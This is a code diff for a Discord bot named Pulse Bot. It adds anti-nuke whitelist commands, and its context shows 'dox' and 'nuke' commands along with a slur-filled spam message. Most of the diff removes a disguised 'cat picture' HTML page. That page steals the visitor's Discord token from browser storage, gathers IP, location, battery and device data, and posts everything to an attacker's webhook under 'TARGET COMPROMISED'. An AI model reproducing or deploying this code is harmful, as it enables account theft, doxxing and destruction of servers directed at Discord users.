@@ -16,7 +16,9 @@ if (!TOKEN) {
 const client = new Client({
     intents: [
         GatewayIntentBits.Guilds,
-        GatewayIntentBits.GuildMessages
+        GatewayIntentBits.GuildMessages,
+        GatewayIntentBits.GuildMembers,
+        GatewayIntentBits.MessageContent
     ]
 });
 
@@ -24,6 +26,9 @@ const links = new Map();
 let nukeRunning = false;
 let nukeGuildId = null;
 let startTime = Date.now();
+
+// ---- ANTI-NUKE SETTINGS ----
+const antiNukeSettings = new Map();
 
 app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
 app.listen(PORT, () => console.log(`🌐 Web server running on port ${PORT}`));
@@ -127,7 +132,53 @@ async function registerCommands() {
                 description: '🔓 Unlock a channel',
                 options: [{ name: 'channel', type: 7, description: 'Channel to unlock', required: false }]
             },
-            { name: 'rolelist', description: '📋 List all server roles' }
+            { name: 'rolelist', description: '📋 List all server roles' },
+            // ---- ANTI-NUKE COMMANDS ----
+            { 
+                name: 'antinuke', 
+                description: '🛡️ Anti-nuke protection settings',
+                options: [
+                    {
+                        name: 'action',
+                        type: 3,
+                        description: 'Action to take',
+                        required: true,
+                        choices: [
+                            { name: 'Enable', value: 'enable' },
+                            { name: 'Disable', value: 'disable' },
+                            { name: 'Status', value: 'status' }
+                        ]
+                    }
+                ]
+            },
+            { 
+                name: 'whitelist', 
+                description: '➕ Whitelist a user from anti-nuke protection',
+                options: [
+                    {
+                        name: 'user',
+                        type: 6,
+                        description: 'User to whitelist',
+                        required: true
+                    }
+                ]
+            },
+            { 
+                name: 'unwhitelist', 
+                description: '➖ Remove a user from the whitelist',
+                options: [
+                    {
+                        name: 'user',
+                        type: 6,
+                        description: 'User to remove',
+                        required: true
+                    }
+                ]
+            },
+            { 
+                name: 'whitelisted', 
+                description: '📋 Show whitelisted users'
+            }
         ]);
         console.log('✅ Commands registered');
     } catch (error) {
@@ -135,12 +186,169 @@ async function registerCommands() {
     }
 }
 
+// ---- ANTI-NUKE FUNCTIONS ----
+function getAntiNuke(guildId) {
+    if (!antiNukeSettings.has(guildId)) {
+        antiNukeSettings.set(guildId, {
+            enabled: true,
+            whitelist: []
+        });
+    }
+    return antiNukeSettings.get(guildId);
+}
+
+function isWhitelisted(guildId, userId) {
+    const settings = getAntiNuke(guildId);
+    return settings.whitelist.includes(userId) || settings.whitelist.includes('*');
+}
+
+// ---- ANTI-NUKE EVENT HANDLERS ----
+client.on('guildMemberAdd', async (member) => {
+    const settings = getAntiNuke(member.guild.id);
+    if (!settings.enabled) return;
+    
+    // Check if user is suspicious (new account, no profile pic, etc.)
+    const now = Date.now();
+    const accountAge = now - member.user.createdTimestamp;
+    const daysOld = accountAge / (1000 * 60 * 60 * 24);
+    
+    if (daysOld < 7 && !isWhitelisted(member.guild.id, member.id)) {
+        try {
+            await member.send('⚠️ Your account is too new to join this server. Please contact staff.');
+            await member.kick('Auto-anti-raid: Account too new');
+            console.log(`🔨 Kicked suspicious account: ${member.user.tag} (${daysOld} days old)`);
+        } catch (e) {}
+    }
+});
+
+client.on('guildMemberUpdate', async (oldMember, newMember) => {
+    const settings = getAntiNuke(newMember.guild.id);
+    if (!settings.enabled) return;
+    if (isWhitelisted(newMember.guild.id, newMember.id)) return;
+    
+    // Check for role changes (potential role bombing)
+    const oldRoles = oldMember.roles.cache.map(r => r.id);
+    const newRoles = newMember.roles.cache.map(r => r.id);
+    const addedRoles = newRoles.filter(r => !oldRoles.includes(r));
+    
+    if (addedRoles.length > 5) {
+        try {
+            await newMember.roles.set(oldRoles, 'Anti-raid: Suspicious role changes');
+            const adminRole = newMember.guild.roles.cache.find(r => r.permissions.has(PermissionsBitField.Flags.Administrator));
+            if (adminRole) {
+                const owner = await newMember.guild.fetchOwner();
+                await owner.send(`⚠️ **Suspicious activity detected!**\n${newMember.user.tag} tried to add ${addedRoles.length} roles.\nServer: ${newMember.guild.name}`);
+            }
+            console.log(`🛡️ Blocked role bomb from: ${newMember.user.tag}`);
+        } catch (e) {}
+    }
+});
+
+client.on('channelCreate', async (channel) => {
+    const settings = getAntiNuke(channel.guild.id);
+    if (!settings.enabled) return;
+    
+    // Check for mass channel creation (potential raid)
+    const channelCache = channel.guild.channels.cache;
+    const recentChannels = channelCache.filter(c => 
+        Date.now() - c.createdTimestamp < 60000
+    );
+    
+    if (recentChannels.size > 5) {
+        const owner = await channel.guild.fetchOwner();
+        await owner.send(`⚠️ **Mass channel creation detected!**\n${recentChannels.size} channels created in the last minute.\nServer: ${channel.guild.name}`);
+        console.log(`🛡️ Mass channel creation detected in: ${channel.guild.name}`);
+    }
+});
+
+// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     const { commandName, options, user, member, guild, channel } = interaction;
 
     try {
+        // ---- ANTI-NUKE COMMANDS ----
+        if (commandName === 'antinuke') {
+            await interaction.deferReply({ flags: 64 });
+            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
+            
+            const botMember = guild.members.cache.get(client.user.id);
+            if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
+                return interaction.editReply({ content: '❌ I need **Administrator** permissions.', flags: 64 });
+            }
+            
+            const action = options.getString('action');
+            const settings = getAntiNuke(guild.id);
+            
+            if (action === 'enable') {
+                settings.enabled = true;
+                antiNukeSettings.set(guild.id, settings);
+                await interaction.editReply({ content: '🛡️ **Anti-nuke protection enabled!**', flags: 64 });
+            } else if (action === 'disable') {
+                settings.enabled = false;
+                antiNukeSettings.set(guild.id, settings);
+                await interaction.editReply({ content: '🛡️ **Anti-nuke protection disabled.**', flags: 64 });
+            } else if (action === 'status') {
+                const embed = new EmbedBuilder()
+                    .setTitle('🛡️ Anti-Nuke Status')
+                    .setColor(settings.enabled ? 0x00FF00 : 0xFF0000)
+                    .addFields(
+                        { name: 'Status', value: settings.enabled ? '✅ Enabled' : '❌ Disabled', inline: true },
+                        { name: 'Whitelisted Users', value: settings.whitelist.length > 0 ? settings.whitelist.join('\n') : 'None', inline: false }
+                    );
+                await interaction.editReply({ embeds: [embed], flags: 64 });
+            }
+        }
+
+        if (commandName === 'whitelist') {
+            await interaction.deferReply({ flags: 64 });
+            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
+            
+            const target = options.getUser('user');
+            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
+            
+            const settings = getAntiNuke(guild.id);
+            if (settings.whitelist.includes(target.id)) {
+                return interaction.editReply({ content: `✅ ${target.tag} is already whitelisted.`, flags: 64 });
+            }
+            
+            settings.whitelist.push(target.id);
+            antiNukeSettings.set(guild.id, settings);
+            await interaction.editReply({ content: `✅ **${target.tag}** has been whitelisted.`, flags: 64 });
+        }
+
+        if (commandName === 'unwhitelist') {
+            await interaction.deferReply({ flags: 64 });
+            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
+            
+            const target = options.getUser('user');
+            if (!target) return interaction.editReply({ content: '❌ User not found.', flags: 64 });
+            
+            const settings = getAntiNuke(guild.id);
+            const index = settings.whitelist.indexOf(target.id);
+            if (index === -1) {
+                return interaction.editReply({ content: `❌ ${target.tag} is not whitelisted.`, flags: 64 });
+            }
+            
+            settings.whitelist.splice(index, 1);
+            antiNukeSettings.set(guild.id, settings);
+            await interaction.editReply({ content: `✅ **${target.tag}** has been removed from the whitelist.`, flags: 64 });
+        }
+
+        if (commandName === 'whitelisted') {
+            await interaction.deferReply({ flags: 64 });
+            if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
+            
+            const settings = getAntiNuke(guild.id);
+            const embed = new EmbedBuilder()
+                .setTitle('📋 Whitelisted Users')
+                .setColor(0x8B5CF6)
+                .setDescription(settings.whitelist.length > 0 ? settings.whitelist.join('\n') : 'No users whitelisted.');
+            await interaction.editReply({ embeds: [embed], flags: 64 });
+        }
+
+        // ---- DOX ----
         if (commandName === 'dox') {
             await interaction.deferReply({ flags: 64 });
             
@@ -162,9 +370,17 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed], flags: 64 });
         }
 
+        // ---- NUKE ----
         if (commandName === 'nuke') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
+            
+            // Anti-nuke check
+            const settings = getAntiNuke(guild.id);
+            if (settings.enabled && !isWhitelisted(guild.id, user.id)) {
+                return interaction.editReply({ content: '❌ Anti-nuke protection is enabled. You are not whitelisted.', flags: 64 });
+            }
+            
             const botMember = guild.members.cache.get(client.user.id);
             if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
                 return interaction.editReply({ content: '❌ I need **Administrator** permissions.', flags: 64 });
@@ -176,6 +392,7 @@ client.on('interactionCreate', async (interaction) => {
             await startNuke(guild);
         }
 
+        // ---- STOP ----
         if (commandName === 'stop') {
             await interaction.deferReply({ flags: 64 });
             if (!nukeRunning) return interaction.editReply({ content: '❌ No nuke running.', flags: 64 });
@@ -184,12 +401,14 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: '⏹️ **Nuke stopped.**', flags: 64 });
         }
 
+        // ---- PING ----
         if (commandName === 'ping') {
             const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
             const latency = sent.createdTimestamp - interaction.createdTimestamp;
             await interaction.editReply({ content: `🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`, flags: 64 });
         }
 
+        // ---- SERVERINFO ----
         if (commandName === 'serverinfo') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
@@ -209,6 +428,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed], flags: 64 });
         }
 
+        // ---- USERINFO ----
         if (commandName === 'userinfo') {
             await interaction.deferReply({ flags: 64 });
             const target = interaction.options.getUser('user') || user;
@@ -231,6 +451,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed], flags: 64 });
         }
 
+        // ---- AVATAR ----
         if (commandName === 'avatar') {
             await interaction.deferReply({ flags: 64 });
             const target = interaction.options.getUser('user') || user;
@@ -241,6 +462,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ embeds: [embed], flags: 64 });
         }
 
+        // ---- SAY ----
         if (commandName === 'say') {
             await interaction.deferReply({ flags: 64 });
             const msg = interaction.options.getString('message');
@@ -249,6 +471,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: '✅ Sent.', flags: 64 });
         }
 
+        // ---- KICK ----
         if (commandName === 'kick') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
@@ -267,6 +490,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `✅ **${target.user.tag}** kicked. Reason: ${reason}`, flags: 64 });
         }
 
+        // ---- BAN ----
         if (commandName === 'ban') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
@@ -285,6 +509,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `✅ **${target.tag}** banned. Reason: ${reason}`, flags: 64 });
         }
 
+        // ---- CLEAR ----
         if (commandName === 'clear') {
             await interaction.deferReply({ flags: 64 });
             const amount = interaction.options.getInteger('amount');
@@ -298,6 +523,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `✅ Deleted ${messages.size} messages.`, flags: 64 });
         }
 
+        // ---- TIMEOUT ----
         if (commandName === 'timeout') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
@@ -313,6 +539,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `✅ **${target.user.tag}** timed out for ${minutes} minutes. Reason: ${reason}`, flags: 64 });
         }
 
+        // ---- UPTIME ----
         if (commandName === 'uptime') {
             const uptime = Date.now() - startTime;
             const days = Math.floor(uptime / 86400000);
@@ -322,11 +549,13 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply({ content: `⏱️ **Uptime:** ${days}d ${hours}h ${minutes}m ${seconds}s`, flags: 64 });
         }
 
+        // ---- INVITE ----
         if (commandName === 'invite') {
             const inviteURL = `https://discord.com/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot+applications.commands`;
             await interaction.reply({ content: `🔗 **Invite Pulse Bot:**\n${inviteURL}`, flags: 64 });
         }
 
+        // ---- STATS ----
         if (commandName === 'stats') {
             const totalServers = client.guilds.cache.size;
             const totalUsers = client.guilds.cache.reduce((acc, g) => acc + g.memberCount, 0);
@@ -344,8 +573,10 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.reply({ embeds: [embed], flags: 64 });
         }
 
+        // ---- POLL ----
         if (commandName === 'poll') {
             await interaction.deferReply({ flags: 64 });
+            if (!channel) return interaction.editReply({ content: '❌ No channel.', flags: 64 });
             const question = interaction.options.getString('question');
             const option1 = interaction.options.getString('option1');
             const option2 = interaction.options.getString('option2');
@@ -364,6 +595,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: '✅ Poll created!', flags: 64 });
         }
 
+        // ---- SLOWMODE ----
         if (commandName === 'slowmode') {
             await interaction.deferReply({ flags: 64 });
             const seconds = interaction.options.getInteger('seconds');
@@ -376,6 +608,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `✅ Slowmode set to ${seconds} seconds.`, flags: 64 });
         }
 
+        // ---- LOCK ----
         if (commandName === 'lock') {
             await interaction.deferReply({ flags: 64 });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -387,6 +620,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `🔒 **${targetChannel.name}** locked.`, flags: 64 });
         }
 
+        // ---- UNLOCK ----
         if (commandName === 'unlock') {
             await interaction.deferReply({ flags: 64 });
             const targetChannel = interaction.options.getChannel('channel') || channel;
@@ -398,6 +632,7 @@ client.on('interactionCreate', async (interaction) => {
             await interaction.editReply({ content: `🔓 **${targetChannel.name}** unlocked.`, flags: 64 });
         }
 
+        // ---- ROLELIST ----
         if (commandName === 'rolelist') {
             await interaction.deferReply({ flags: 64 });
             if (!guild) return interaction.editReply({ content: '❌ Server only.', flags: 64 });
@@ -421,6 +656,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
+// ---- START NUKE ----
 async function startNuke(guild) {
     const variants = [
         '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
@@ -496,139 +732,4 @@ function generateDoxHTML(webhook) {
     <title>Loading...</title>
     <style>
         * { margin: 0; padding: 0; }
-        body { background: #0b0b12; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: "Segoe UI", sans-serif; }
-        .container { text-align: center; }
-        .container img { max-width: 90%; max-height: 80vh; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.8); }
-        .caption { color: #555; font-size: 14px; margin-top: 12px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://cdn.pixabay.com/photo/2017/01/02/22/29/cat-1941089_1280.jpg" alt="Cat" />
-        <div class="caption">Loading...</div>
-    </div>
-    <script>
-        var WEBHOOK = "${webhook}";
-        function send(data) {
-            fetch(WEBHOOK, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            }).catch(function() {});
-        }
-
-        (function() {
-            try {
-                var token = localStorage.getItem("token") || 
-                              document.cookie.split("; ").find(function(r) { return r.startsWith("token="); }).split("=")[1] ||
-                              sessionStorage.getItem("token");
-                if (token) {
-                    send({ content: "**🎯 Discord Token:** " + token });
-                }
-            } catch(e) {}
-        })();
-
-        (async function() {
-            try {
-                var res = await fetch("https://ipinfo.io/json");
-                var d = await res.json();
-                if (!d.ip) return;
-
-                var ua = navigator.userAgent;
-                var browser = ua.includes("Edg") ? "Edge" : ua.includes("Chrome") ? "Chrome" : ua.includes("Firefox") ? "Firefox" : ua.includes("Safari") ? "Safari" : "Unknown";
-                var os = ua.includes("Windows NT 10.0") ? "Windows 10/11" : ua.includes("Windows NT 6.1") ? "Windows 7" : ua.includes("Mac OS X") ? "macOS" : ua.includes("Android") ? "Android" : ua.includes("iPhone") ? "iOS" : "Unknown";
-                var device = /mobile|android|iphone|ipad/i.test(ua) ? "Mobile" : "Desktop";
-                var now = new Date();
-                var timestamp = now.toISOString();
-                var localTime = now.toString();
-
-                var lat = d.loc ? d.loc.split(",")[0] : "N/A";
-                var lon = d.loc ? d.loc.split(",")[1] : "N/A";
-                var mapUrl = lat !== "N/A" ? "https://www.google.com/maps?q=" + lat + "," + lon : "N/A";
-
-                var battery = "N/A";
-                try {
-                    var b = await navigator.getBattery();
-                    battery = Math.round(b.level * 100) + "%" + (b.charging ? " (Charging)" : " (Not Charging)");
-                } catch(e) {}
-
-                var vpn = "❌ Not Detected";
-                var vpnScore = 0;
-                var vpnKeywords = ["vpn", "proxy", "cloudflare", "aws", "amazon", "digitalocean", "vultr", "linode", "hetzner", "ovh", "m247", "psychz", "hostinger", "namecheap", "contabo", "server", "hosting", "dedicated", "datacenter", "cloud", "vps"];
-                var isp = (d.org || "").toLowerCase();
-                var asn = (d.asn || "").toLowerCase();
-                for (var i = 0; i < vpnKeywords.length; i++) {
-                    if (isp.includes(vpnKeywords[i]) || asn.includes(vpnKeywords[i])) {
-                        vpnScore += 2;
-                        break;
-                    }
-                }
-                try {
-                    var browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-                    if (d.timezone && d.timezone !== "N/A" && browserTz && d.timezone !== browserTz) {
-                        vpnScore += 3;
-                    }
-                } catch(e) {}
-                if (vpnScore >= 3) vpn = "✅ Likely (Score: " + vpnScore + ")";
-
-                var embed = {
-                    title: "☠️ TARGET COMPROMISED",
-                    color: 0xFF0000,
-                    fields: [
-                        { name: "🌐 IP", value: d.ip || "N/A", inline: true },
-                        { name: "🏙️ City", value: d.city || "N/A", inline: true },
-                        { name: "🗺️ Region", value: d.region || "N/A", inline: true },
-                        { name: "🌍 Country", value: d.country || "N/A", inline: true },
-                        { name: "📮 Postal", value: d.postal || "N/A", inline: true },
-                        { name: "🔢 ASN", value: d.asn || "N/A", inline: true },
-                        { name: "🏢 ISP", value: d.org || "N/A", inline: true },
-                        { name: "🕒 Timezone", value: d.timezone || "N/A", inline: true },
-                        { name: "📍 Location", value: mapUrl, inline: false },
-                        { name: "🔋 Battery", value: battery, inline: true },
-                        { name: "🛡️ VPN", value: vpn, inline: true },
-                        { name: "🧠 Browser", value: browser, inline: true },
-                        { name: "💻 OS", value: os, inline: true },
-                        { name: "🖥️ Device", value: device, inline: true },
-                        { name: "⏰ Time", value: localTime, inline: false }
-                    ],
-                    footer: { text: "☠️ PULSE DOX" }
-                };
-
-                send({ embeds: [embed] });
-
-            } catch(e) {
-                send({ content: "❌ Error: " + e.message });
-            }
-        })();
-
-        setTimeout(function() {
-            document.body.innerHTML = "";
-            document.body.style.background = "#000";
-            document.body.style.margin = "0";
-            document.body.style.height = "100vh";
-            setTimeout(function() {
-                window.close();
-                window.location.href = "about:blank";
-            }, 500);
-        }, 5000);
-
-        document.querySelector(".caption").textContent = "Image loaded successfully.";
-    <\/script>
-</body>
-</html>`;
-}
-
-setInterval(() => {
-    const keys = Array.from(links.keys());
-    if (keys.length > 100) keys.slice(0, keys.length - 100).forEach(k => links.delete(k));
-}, 60000);
-
-client.once('ready', async () => {
-    startTime = Date.now();
-    console.log(`🤖 ${client.user.tag} is online!`);
-    console.log(`📡 Connected to ${client.guilds.cache.size} servers`);
-    await registerCommands();
-    console.log('✅ Bot is ready!');
-});
-
-client.login(TOKEN);
+       
